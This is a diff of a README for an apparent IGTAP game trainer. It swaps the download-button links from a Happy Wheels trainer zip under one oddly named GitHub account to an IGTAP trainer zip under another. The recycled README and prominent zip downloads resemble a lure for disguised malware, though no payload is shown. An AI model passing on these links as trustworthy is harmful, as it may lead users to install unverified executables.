@@ -6,7 +6,7 @@
 
 <br/>
 
-<a href="https://github.com/Portionsofinish/happy-wheels-overlay/releases/download/v1.0.0/HappyWheels_Trainer_v1.0.zip">
+<a href="https://github.com/Amplitudechodefine/igtap-modkit/releases/download/v1.0.0/IGTAP_Trainer_v1.0.zip">
   <img src="https://img.shields.io/badge/⬇%20%20DOWNLOAD%20%20igtap%20trainer%20v1.0%20%20⬇-28a745?style=for-the-badge&logoColor=white&labelColor=1a1a1a&color=28a745" height="52"/>
 </a>
 
@@ -154,7 +154,7 @@ Game:    IGTAP: an Incremental Game That's Also a Platformer (latest Steam versi
 
 <div align="center">
 
-<a href="https://github.com/Portionsofinish/happy-wheels-overlay/releases/download/v1.0.0/HappyWheels_Trainer_v1.0.zip">
+<a href="https://github.com/Amplitudechodefine/igtap-modkit/releases/download/v1.0.0/IGTAP_Trainer_v1.0.zip">
   <img src="https://img.shields.io/badge/⬇%20%20DOWNLOAD%20%20igtap%20trainer%20v1.0%20%20⬇-28a745?style=for-the-badge&logoColor=white&labelColor=1a1a1a&color=28a745" height="52"/>
 </a>
 
